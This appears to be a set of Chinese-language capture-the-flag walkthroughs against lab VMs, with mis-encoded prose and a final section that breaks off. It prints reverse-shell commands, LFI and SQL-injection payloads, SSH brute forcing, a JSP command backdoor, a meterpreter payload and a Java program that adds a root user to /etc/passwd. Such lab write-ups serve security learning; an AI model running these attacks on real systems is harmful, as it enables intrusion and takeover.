&#x2F;var&#x2F;www&#x2F;html&#x2F;ftp.zip &#x2F;var&#x2F;ftp åœ¨Kaliä¸‹è½½å¹¶è§£å‹ 12curl -O http:&#x2F;&#x2F;192.168.1.105&#x2F;ftp.zipunzip ftp.zip æ”¶é›†ä¿¡æ¯ 123456789ls -l var&#x2F;ftp&#x2F;pub&#x2F;howardtotal 36-rw-r--r-- 1 root root 273 Mar 3 17:05 note.txt-rw-r--r-- 1 root root 30762 Mar 5 19:29 super_secret_nasa_stuff_here.zipcat var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;note.txtPlease go away, nothing interesing here. I just had to temporary store some nasa data herebecause my laptop had a virus from some weird websites I visited ... anyway ...And don&#39;t bother looking at my secret data I have encrypted them pretty well. I am an MIT engineer! çˆ†ç ´å‹ç¼©åŒ… 123456fcrackzip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u super_secret_nasa_stuff_here.zipPASSWORD FOUND!!!!: pw &#x3D;&#x3D; astronautunzip -P astronaut super_secret_nasa_stuff_here.zipArchive: super_secret_nasa_stuff_here.zip inflating: marsroversketch.jpg éšå†™çˆ†ç ´ 123456789pip3 install stegcrackerstegcracker var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;marsroversketch.jpg &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txtSuccessfully cracked file with password: iloveyoumomTried 51349 passwordsYour file has been written to: var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;marsroversketch.jpg.outcat var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;marsroversketch.jpg.outFLAG-howard&#123;b3d1baf22e07874bf744ad7947519bf4&#125; FLAG-howard&#123;b3d1baf22e07874bf744ad7947519bf4&#125; FLAG-leonard æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ 123456789101112131415161718cat &#x2F;etc&#x2F;crontab# &#x2F;etc&#x2F;crontab: system-wide crontab# Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;# command to install the new version when you edit this file# and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,# that none of the other crontabs do.SHELL&#x3D;&#x2F;bin&#x2F;shPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin# m h dom mon dow user command17 * * * * root cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly25 6 * * * root test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )47 6 * * 7 root test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )52 6 1 * * root test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )*&#x2F;1 * * * * root &#x2F;home&#x2F;leonard&#x2F;thermostat_set_temp.py# æŸ¥çœ‹æ–‡ä»¶/home/leonard/thermostat_set_temp.py 123ls -l &#x2F;home&#x2F;leonardtotal 4-rwxrwxrwx 1 root root 42 Mar 30 15:52 thermostat_set_temp.sh è®¡åˆ’ä»»åŠ¡é‡Œå†™çš„æ˜¯.pyï¼Œä½†è¿™é‡Œæ˜¯.sh? æ–‡ä»¶å¯å†™ï¼Œå¯ä»¥å†™å…¥åå¼¹bashå‘½ä»¤ 1echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.3&#x2F;9990 0&gt;&amp;1&quot; &gt; &#x2F;home&#x2F;leonard&#x2F;thermostat_set_temp.sh æœ¬åœ°ç›‘å¬9990ç«¯å£ 1234567891011nc -lvnp 9990Ncat: Version 7.80 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )Ncat: Listening on :::9990Ncat: Listening on 0.0.0.0:9990Ncat: Connection from 192.168.1.105.Ncat: Connection from 192.168.1.105:42922.bash: cannot set terminal process group (2108): Inappropriate ioctl for devicebash: no job control in this shellid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) æŸ¥çœ‹flag 12cat FLAG-leonard.txtFLAG-leonard&#123;17fc95224b65286941c54747704acd3e&#125; FLAG-leonard&#123;17fc95224b65286941c54747704acd3e&#125; /etc/crontab ç”±äºä¹‹å‰ä¸€ç›´æ²¡æœ‰æ¥è§¦åˆ°è®¡åˆ’ä»»åŠ¡çš„ææƒæ–¹æ³•ï¼Œåœ¨æ“ä½œè¿‡ç¨‹ä¸­ä¾¿æ²¡æœ‰æƒ³åˆ°è¿™ä¸€ç‚¹ å…¶åŸç†å¤§æ¦‚ä¸SUIDå·®ä¸å¤šï¼Œä½æƒç”¨æˆ·ä»¥é«˜æƒç”¨æˆ·çš„èº«ä»½æ‰§è¡Œå‘½ä»¤ grepé«˜äº® åœ¨grepèŠ‚é€‰flagæ—¶ï¼Œå‡ºç°äº†å›æ˜¾ï¼Œä¾¿è¯´æ˜å­˜åœ¨&quot;FLAG&quot;å­—æ ·ï¼Œä½†æ˜¯ç”±äºå­—ç¬¦å¤ªå¤šã€å¤ªå¯†ï¼Œéš¾ä»¥å¯»æ‰¾flag ä¸ªäººæ“ä½œæ—¶ç›´æ¥å°†æ–‡æœ¬æ‹·è´è‡³windowsçš„notepad++ä¸­ï¼Œç„¶åCtrl+FæŸ¥æ‰¾ åæ¥æƒ³åˆ°grepå¯ä»¥é«˜äº®æ–‡æœ¬ï¼ŒåŠ ä¸Šå‚æ•°--color=autoå³å¯ æœç‚¹ æˆ–è®¸ç”¨ä¿¡æ¯æ‰«è¡æ¥æè¿°è¿™ä¸€è¡Œä¸ºæ›´åˆé€‚ å½“æ—¶ä¸ªäººçŠ¶æ€ä¸ä½³ï¼Œæ²¡æœ‰ä»”ç»†æ€è€ƒå°±ç”¨ftpå®¢æˆ·ç«¯è¿ä¸ŠæœåŠ¡å™¨ï¼Œç„¶åç”¨getå‘½ä»¤ä¸€ä¸ªä¸€ä¸ªåœ°ä¸‹è½½æ–‡ä»¶ åæ¥å‘ç°è¿˜æ˜¯æ¼äº†ä¸€äº›æ¯”è¾ƒé‡è¦çš„ä¿¡æ¯ æˆ–è®¸åœ¨åŠ¨æ‰‹ä¹‹å‰éœ€è¦æ€è€ƒä¸‹ï¼Œå¦‚ä½•è·å–ä¿¡æ¯æ˜¯æœ€ä¾¿æ·çš„ï¼Œæœ‰å“ªäº›åœ°æ–¹éœ€è¦æœæŸ¥ï¼Œå¦åˆ™å¯èƒ½ä¼šå› ä¸ºä¸€æ¬¡æœç‚¹çš„å°ç–æ¼è€Œè®©å·¥ä½œé‡æå‡ä¸€åŠã€‚ å‚è€ƒèµ„æ–™ WP Mysql.Backup curl.Download grep.highlight Deception1.1 2020/04/04 23:31:03 ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.110 12345678910111213141516171819202122Nmap scan report for 192.168.31.110Host is up (0.00031s latency).Not shown: 65533 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 75:b3:93:d4:f1:02:30:bf:35:ea:12:4e:3b:e7:fa:4a (RSA)| 256 f9:8c:43:5b:45:7d:fe:84:b1:f5:93:a3:68:bb:ce:84 (ECDSA)|_ 256 77:2a:33:3e:8f:2b:65:a5:f3:df:b5:bc:58:4a:f4:8e (ED25519)80&#x2F;tcp open http Apache httpd 2.4.38 ((Debian))| http-methods: |_ Supported Methods: POST OPTIONS HEAD GET|_http-server-header: Apache&#x2F;2.4.38 (Debian)|_http-title: Site doesn&#39;t have a title (text&#x2F;html).MAC Address: 08:00:27:4B:4E:6D (Oracle VirtualBox virtual NIC)Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)No exact OS matches for host (test conditions non-ideal).Uptime guess: 22.680 days (since Thu Mar 12 19:47:39 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;263 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Webè·¯å¾„æšä¸¾ å°è¯•çˆ†ç ´80ç«¯å£ä¸‹çš„Webè·¯å¾„ dirb http://192.168.31.110/ -w 1234---- Scanning URL: http:&#x2F;&#x2F;192.168.31.110&#x2F; ----+ http:&#x2F;&#x2F;192.168.31.110&#x2F;index.html (CODE:200|SIZE:1315) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.110&#x2F;manual&#x2F; + http:&#x2F;&#x2F;192.168.31.110&#x2F;server-status (CODE:403|SIZE:279) æ¼æ´åˆ©ç”¨ è®¿é—®/ è¯¥é¡µé¢æä¾›ä¸€ä¸ªå¯†ç å¼ºåº¦æ£€æµ‹çš„åŠŸèƒ½ è‹¥å¯†ç ä¸­å«æœ‰å¤§å†™å­—æ¯ã€å°å†™å­—æ¯ã€æ•°å­—ã€ç‰¹æ®Šç¬¦å·ï¼Œä¸”é•¿åº¦ä¸º8ä½åŠä¸Šï¼Œåˆ™ä¼šç”¨alertå¼¹å‡ºä¿¡æ¯ 0000flagflagflagflag.php è€Œä¸”é¡µé¢å†…çš„å†…å®¹ä¸º Password is strong , contains all 4 things(uppercase,lowercase,number,specialchars) with flag=1 è¿™é‡Œçš„with flag=1å°±æ˜¯ä¸ªæç¤º å°è¯•åå‘ç°å­˜åœ¨phpæ–‡ä»¶/00001111.php alterå¼¹å‡ºä¿¡æ¯ä¸ºfind password.txt é¡µé¢å†…å®¹ä¸ºç©ºç™½ æºä»£ç ä¸­å­˜åœ¨æ³¨é‡Šä¿¡æ¯use ?page= å³å¯ä»¥ä½¿ç”¨getå‚æ•°page è®¿é—®/00001111.php?page=index.html æ­¤æ—¶ä»¥é¡µé¢ä¸ºä¸»é¡µï¼Œåˆ™å¯åˆ¤æ–­pageå‚æ•°å­˜åœ¨åŒ…å«åŠŸèƒ½ æœ‰ä¸¤ç§åˆ©ç”¨æ–¹å¼ phpä¼ªåè®®è¿›è¡ŒLFI fileä¼ªåè®®ç›´æ¥è¯»å–æ–‡ä»¶ æµ‹è¯•è¿‡ç¨‹ä¸­ä¸¤ç§æ–¹æ³•å‡å¯ä½¿ç”¨ï¼ŒPOCå¦‚ä¸‹ 12?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd?page&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd å°è¯•å¯»æ‰¾password.txt æœ€ååœ¨æ‰¾åˆ°è·¯å¾„ä¸º/var/password.txt 123?page&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;password.txtI know the password for yash : ya5h** but I forgot the last 2 words. find them and use to connect to SSH æ„é€ å­—å…¸å¦‚ä¸‹ 12345678910cat dic.py#!&#x2F;bin&#x2F;python2raw &#x3D; &#39;ya5h&#39;charset &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#96;~!@#$%^&amp;*()_+-&#x3D;[]&#123;&#125;\\|;:\\&#39;&quot;,.&lt;&gt;&#x2F;?&#39;for i in charset: for j in charset: print raw + i + j ä½¿ç”¨hydraå¯¹äºSSHæœåŠ¡è¿›è¡Œçˆ†ç ´ 1234python dic.py &gt; passhydra -I -l yash -P pass -V ssh:&#x2F;&#x2F;192.168.31.110[22][ssh] host: 192.168.31.110 login: yash password: ya5hay å¾—åˆ°è´¦æˆ·yash æƒé™æå‡ ç™»å…¥æœåŠ¡å™¨ 12ssh yash@192.168.31.110ya5hay æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ 12345678910111213141516171819202122232425cat &#x2F;etc&#x2F;crontab# &#x2F;etc&#x2F;crontab: system-wide crontab# Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;# command to install the new version when you edit this file# and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,# that none of the other crontabs do.SHELL&#x3D;&#x2F;bin&#x2F;shPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin# Example of job definition:# .---------------- minute (0 - 59)# | .------------- hour (0 - 23)# | | .---------- day of month (1 - 31)# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...# | | | | .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat# | | | | |# * * * * * user-name command to be executed17 * * * * root cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly25 6 * * * root test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )47 6 * * 7 root test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )52 6 1 * * root test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )#*&#x2F;1 * * * * &#x2F;home&#x2F;yash&#x2F;perm.sh æŸ¥çœ‹æ–‡ä»¶/home/yash/perm.shçš„æƒé™ 123ls -l &#x2F;home&#x2F;yash&#x2F;perm.sh -rwxrw-rw- 1 root root 29 Apr 5 2020 &#x2F;home&#x2F;yash&#x2F;perm.sh è¯¥æ–‡ä»¶å¯å†™ï¼Œå¯ä»¥åˆ©ç”¨æ”¹æ–‡ä»¶è¿›è¡Œè®¡åˆ’ä»»åŠ¡ææƒ 1echo &#39;nc -e &#x2F;bin&#x2F;sh 192.168.31.10 9890&#39; &gt; perm.sh Kaliä¸Šç›‘å¬ç«¯å£ 1234nc -lvnp 9890iduid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) å‚è€ƒèµ„æ–™ LFI Infosec_Warrior01 2020/04/12 11:41:51 ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.172 123456789101112131415161718192021222324Nmap scan report for 192.168.31.172Host is up (0.00054s latency).Not shown: 65533 filtered portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 5.3 (protocol 2.0)| ssh-hostkey: | 1024 2f:b3:a5:cd:e5:14:33:a1:82:3b:dd:5a:5e:d7:59:36 (DSA)|_ 2048 2d:b4:15:28:36:d8:b5:4e:18:81:8e:af:3e:e4:de:c1 (RSA)80&#x2F;tcp open http Apache httpd 2.2.15 ((CentOS))| http-methods: | Supported Methods: GET HEAD POST OPTIONS TRACE|_ Potentially risky methods: TRACE|_http-server-header: Apache&#x2F;2.2.15 (CentOS)|_http-title: Apache HTTP Server Test Page powered by CentOSMAC Address: 08:00:27:EC:26:4D (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 2.6.X|3.XOS CPE: cpe:&#x2F;o:linux:linux_kernel:2.6 cpe:&#x2F;o:linux:linux_kernel:3OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13Uptime guess: 0.001 days (since Sat Apr 11 23:43:10 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)IP ID Sequence Generation: All zeros Webè·¯å¾„æšä¸¾ dirb http://192.168.31.172/ -w 1234---- Scanning URL: http:&#x2F;&#x2F;192.168.31.172&#x2F; ----+ http:&#x2F;&#x2F;192.168.31.172&#x2F;cgi-bin&#x2F; (CODE:403|SIZE:290) + http:&#x2F;&#x2F;192.168.31.172&#x2F;sitemap.xml (CODE:200|SIZE:292) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.172&#x2F;wordpress&#x2F; è®¿é—®http://192.168.31.172/wordpress/ å“åº”çŠ¶æ€ç ä¸º500ï¼Œæ˜¾ç¤ºError establishing a database connection Wordpressæ¡†æ¶ä¸å¯ç”¨ è®¿é—®http://192.168.31.172/sitemap.xml 12345678&lt;urlset&gt; &lt;url&gt; &lt;loc&gt;http:&#x2F;&#x2F;infosecwarrior.com&#x2F;index.htnl&lt;&#x2F;loc&gt; &lt;lastmod&gt;2020-02-13&lt;&#x2F;lastmod&gt; &lt;changefreq&gt;monthly&lt;&#x2F;changefreq&gt; &lt;priority&gt;0.8&lt;&#x2F;priority&gt; &lt;&#x2F;url&gt;&lt;&#x2F;urlset&gt; æ¼æ´åˆ©ç”¨ è®¿é—®http://192.168.31.172/sitemap.xmlæœ‰ä¸€è¡Œå†…å®¹ &lt;loc&gt;http://infosecwarrior.com/index.htnl&lt;/loc&gt; è®¿é—®http://192.168.31.172/index.htnlæˆåŠŸ å®¡è®¡htmlä»£ç  123456&lt;form action&#x3D;&quot;&#x2F;cmd.php&quot; method&#x3D;&quot;GET&quot; hidden&#x3D;&quot;True&quot;&gt; command &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;AI&quot; value&#x3D;&quot;&quot; maxlength&#x3D;&quot;100&quot;&gt; &lt;br&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;&lt;&#x2F;form&gt; åˆ å»hidden=&quot;True&quot; å°è¯•è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œåœ¨è¡¨å•ä¸­è¾“å…¥ls å›æ˜¾ä¸º 12Now the main part what it is looooooolTry other method è€Œä¸”URLä¸ºhttp://192.168.31.172/cmd.php?AI=ls æ”¹ä¸ºPOSTè¯·æ±‚ æ‰§è¡ŒæˆåŠŸ 1234567891011curl http:&#x2F;&#x2F;192.168.31.172&#x2F;cmd.php -d &quot;AI&#x3D;ls&quot;You Found ME : - (cmd.phphacker.gifindex.htnlminnions.gifnote.txtsitemap.xmlwordpress å³å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ æŸ¥çœ‹cmd.phpçš„å†…å®¹ 1234curl http:&#x2F;&#x2F;192.168.31.172&#x2F;cmd.php -d &quot;AI&#x3D;cat cmd.php&quot;$user&#x3D;&quot;isw0&quot;;$pass&#x3D;&quot;123456789blabla&quot;; è·å–åˆ°è´¦æˆ· æƒé™æå‡ ç™»å…¥æœåŠ¡å™¨çš„SSHæœåŠ¡ 12ssh isw0@192.168.31.172123456789blabla æŸ¥çœ‹sudoæƒé™ 12345sudo -lUser isw0 may run the following commands on this host: (!root) NOPASSWD: &#x2F;bin&#x2F;bash (root) &#x2F;bin&#x2F;ping, (root) &#x2F;bin&#x2F;ping6, (root) &#x2F;bin&#x2F;rpm, (root) &#x2F;bin&#x2F;ls, (root) &#x2F;bin&#x2F;mktemp ä½¿ç”¨rootè´¦æˆ·çš„rpmå‘½ä»¤è¿›è¡Œæƒé™æå‡ 1234sudo -u root rpm --eval &#39;%&#123;lua:posix.exec(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;iduid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) context&#x3D;unconfined_u:system_r:rpm_script_t:s0-s0:c0.c1023 WordpressæœåŠ¡500 åœ¨ä¹‹å‰çš„é¶æœºä¸­ä»æ¥æ²¡æœ‰é‡åˆ°è¿™ä¸ªæƒ…å†µï¼Œä¾¿ä¸»è§‚åœ°çŒœæµ‹é¶æœºé…ç½®æ˜¯å¦æœ‰è¯¯ï¼Œæœ€åçœ‹WPçš„æ€è·¯æ‰è®©æˆ‘é¡¿æ‚Ÿã€‚æœ‰å‡ åˆ†è„‘æ´ï¼Œä½†æ˜¯sitemap.xmlä¹Ÿç¡®å®è¢«dirbæ‰«æå‡ºæ¥äº†ï¼Œé‡Œé¢çš„index.htnlä¹Ÿæ˜¯åœ¨æç¤ºç©å®¶ï¼Œåªèƒ½è¯´æ”¶é›†ä¿¡æ¯çš„æ—¶å€™è¿˜æ˜¯è¦ä»”ç»†çœ‹çœ‹ï¼Œæ¯•ç«Ÿindex.htmlå’Œindex.htnlä¹ä¸€çœ‹å¤ªéš¾ä»¥åŒºåˆ† rpmæ‰§è¡Œå‘½ä»¤ ä¹ä¸€çœ‹rpmæœ‰sudoï¼Œä»¥ä¸ºè¦æ„é€ æ¶æ„å®‰è£…åŒ…æ¥è·å–ææƒï¼Œæ²¡æƒ³åˆ°rpmå¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ å‚è€ƒèµ„æ–™ WP rpm.payload My Tomcat Host: 1 2020/04/25 00:43:06 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.166 Webè·¯å¾„æ‰«æ dirb http://192.168.31.166:8080/ -w æ¼æ´åˆ©ç”¨ ç”¨æµè§ˆå™¨è®¿é—®8080ç«¯å£çš„é¡µé¢ ç‚¹å‡»å·¦ä¾§Manager AppæŒ‰é’®è¿›è¡Œç™»å½•ï¼Œä½¿ç”¨é»˜è®¤è´¦æˆ·tomcat:tomcatç™»å…¥æˆåŠŸ ä¸Šä¼ jspåé—¨ è¿™é‡Œç”¨äº†ä¸¤ä¸ªjspåé—¨ ä¸€ä¸ªç”¨äºæµè§ˆæ–‡ä»¶(https://github.com/rohitcoder/BackDoors) ä¸€ä¸ªç”¨äºæ‰§è¡Œå‘½ä»¤(https://www.cnblogs.com/swyft/articles/5563732.html) ç¬¬ä¸€ä¸ªåé—¨çš„æ‰§è¡Œå‘½ä»¤æ¨¡å—æ— æ³•ä½¿ç”¨ ä¿å­˜åé—¨ï¼Œå‹ç¼©zipåŒ…ï¼Œæ”¹åç¼€ä¸ºwarï¼Œç„¶ååœ¨Manageré¡µé¢è¿›è¡ŒwaråŒ…çš„éƒ¨ç½² waråŒ…çš„éƒ¨ç½²å°±ç›¸å½“äºåœ¨ç½‘ç«™æ ¹ç›®å½•è§£å‹äº†waråŒ…ï¼Œè®¿é—®æ—¶éœ€è¦waråŒ…çš„æ–‡ä»¶åä»¥åŠåŒ…å†…çš„æ–‡ä»¶å å¦‚ï¼š åœ¨å‹ç¼©zipæ—¶ï¼Œå‹ç¼©æ–‡ä»¶çš„æ–‡ä»¶åä¸ºnew1.jspï¼Œè€Œå‹ç¼©ä¹‹åçš„zipæ–‡ä»¶æ”¹åä¸ºnew2.warï¼Œé‚£ä¹ˆåœ¨éƒ¨ç½²ä¹‹åéœ€è¦è®¿é—®/new2/new1.jsp åœ¨ç¬¬äºŒä¸ªåé—¨ä¸­æŸ¥çœ‹æƒé™ åœ¨ç¬¬ä¸€ä¸ªåé—¨ä¸­æŸ¥çœ‹æ–‡ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°nc åªå¥½ç”¨meterpreteræ¥è·å–ä¸€ä¸ªshell msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=3693 -f elf &gt; hello.elf ç„¶ååœ¨ç¬¬ä¸€ä¸ªåé—¨ä¸­ä¸Šä¼ åˆ°ç›®å½•/tmpä¸‹ åœ¨MSFä¸­è¿è¡Œhandler 12345use exploit&#x2F;multi&#x2F;handlerset payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.10set LPORT 3693run ä¸Šä¼ ä¹‹åæ˜¯æ²¡æœ‰Xæƒé™çš„ï¼Œè¿™æ—¶å¯ä»¥åœ¨ç¬¬äºŒä¸ªåé—¨ä¸­è¿›è¡Œèµ‹æƒ ä½†æ˜¯éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼šè¦å¯¹å‘½ä»¤è¿›è¡Œurlç¼–ç ï¼Œä»¥é˜²æ­¢urlä¸­çš„ç‰¹æ®Šç¬¦å·å¯¼è‡´å‘½ä»¤æ— æ³•æ‰§è¡Œ urlç¼–ç çš„ç»“æœä¸ºchmod%20%2Bx%20%2Ftmp%2Fhello.elf ç„¶åæ‰§è¡Œmeterpreter %2Ftmp%2Fhello.elf MSFä¸­å°±æ¥æ”¶åˆ°äº†shell æƒé™æå‡ åœ¨meterpreterçš„shellä¸­è·å–ä¸€ä¸ªptyï¼Œä»¥ä¾¿ä¹‹åçš„åˆ‡æ¢è´¦æˆ·æ“ä½œ 12shellpython -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; è¿™é‡Œå¯ä»¥çœ‹åˆ°tomcatè´¦æˆ·å¯ä»¥ä»¥ä»»ä½•è´¦æˆ·çš„èº«ä»½æ¥æ‰§è¡Œjavaï¼Œè€Œä¸”ä¸éœ€è¦å¯†ç  è¿™å¾ˆå¯èƒ½æ˜¯ææƒçš„ä¸€ä¸ªçªç ´å£ æ„é€ å¯†ç hash æ„é€ jaråŒ…æ¥æ‰§è¡Œä¿®æ”¹passwdæ–‡ä»¶çš„å‘½ä»¤ 1234567891011121314151617181920212223242526cat sudo.javaimport java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;public class sudo &#123; public static void main(String[] args) &#123; ProcessBuilder processBuilder &#x3D; new ProcessBuilder(); processBuilder.command(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;echo &#39;test:$6$q.1oPln23FUPQYds$pRZlkAKZ6tN.N4c5kUCKsCF.QW1kdbnLGLTpI3XKgidZuHzbxZzjdONAzoTHgfJHh9NU2E0pO32ICFc5zL78.&#x2F;:0:0::&#x2F;:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd&quot;); try &#123; Process process &#x3D; processBuilder.start(); BufferedReader reader &#x3D; new BufferedReader(new InputStreamReader(process.getInputStream())); String line; while ((line &#x3D; reader.readLine()) !&#x3D; null) &#123; System.out.println(line); &#125; int exitCode &#x3D; process.waitFor(); System.out.println(&quot;\\nExited with error code : &quot; + exitCode); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;&#125; åœ¨Kaliå¯ç”¨HTTPæœåŠ¡ python -m 'SimpleHTTPServer' 8800 &amp; åœ¨Shellä¸­ä½¿ç”¨wgetä¸‹è½½javaæ–‡ä»¶ wget http://192.168.31.10:8800/sudo.java æ‰§è¡ŒEXP 12javac sudo.javasudo -u root java sudo æˆåŠŸå°†è´¦æˆ·ä¿¡æ¯å†™å…¥passwdæ–‡ä»¶ åˆ‡æ¢è´¦æˆ·å³ä¸ºrootæƒé™ JSPåé—¨è„šæœ¬ 123456789101112&lt;% if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream(); int a &#x3D; -1; byte[] b &#x3D; new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a&#x3D;in.read(b))!&#x3D;-1)&#123; out.println(new String(b)); &#125; out.print(&quot;&lt;&#x2F;pre&gt;&quot;); &#125;%&gt; å‚è€ƒèµ„æ–™ jsp.backdoor jsp.backdoor java jar Clound AV 2020/05/07 22:41:53 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.160 Webè·¯å¾„æ‰«æ dirb http://192.168.31.160:8080/ -w æ¼æ´åˆ©ç”¨ è®¿é—®http://192.168.31.160:8080/ï¼Œå¦‚å›¾ ä½¿ç”¨burpæ”¹å˜postä¼ é€’çš„passwordçš„å€¼ä¸º%00 å‡ºç°æŠ¥é”™é¡µé¢ å¯ä»¥çœ‹åˆ°è¿™é‡Œå­˜åœ¨sqlè¯­å¥ï¼Œç®€å•åˆ†æåå¯ä»¥åˆ¤æ–­å­˜åœ¨sqlæ³¨å…¥ï¼Œæ³¨æ„è¿™é‡Œpasswordå­—æ®µä¸¤ä¾§æ˜¯ç”¨åŒå¼•å·ï¼Œè¿›è¡Œsqlæ³¨å…¥æ—¶åŒæ ·éœ€è¦ä½¿ç”¨åŒå¼•å· æ„é€ è¯­å¥1&quot; or 1--+ æˆåŠŸç™»å…¥é¡µé¢ è¿™é‡Œé€šè¿‡è¾“å…¥æ–‡ä»¶åæ¥å¯¹æ–‡ä»¶è¿›è¡Œåˆ†æï¼Œè¿™é‡Œè‡ªç„¶å¯ä»¥è”æƒ³åˆ°å¸¸è§çš„&quot;Ping tool &amp; Code Injection&quot;ï¼Œæ˜¾ç¤ºå‡ºls -lçš„ç»“æœä¹Ÿç®—æ˜¯ä¸€ç§æç¤ºå§ æœ¬æ¥ä»¥ä¸ºè¿™é‡Œæ˜¯å¸¸è§çš„æœ‰å›æ˜¾å‘½ä»¤æ³¨å…¥ï¼Œä½†æ˜¯è¿™ä¸ªå›æ˜¾å®åœ¨æ‰«æç—…æ¯’çš„ç»“æŸä¹‹åæ‰å‡ºç°ï¼Œè€Œä¸”æœ¬äººè¿›è¡Œæµ‹è¯•çš„æ—¶å€™æ‰«ææ—¶é—´å¾ˆé•¿ ä¸ºäº†åˆ¤æ–­èƒ½å¦æ‰§è¡Œå‘½ä»¤ï¼Œåœ¨Kaliä¸Šå¼€å¯HTTPæœåŠ¡ pythom -m 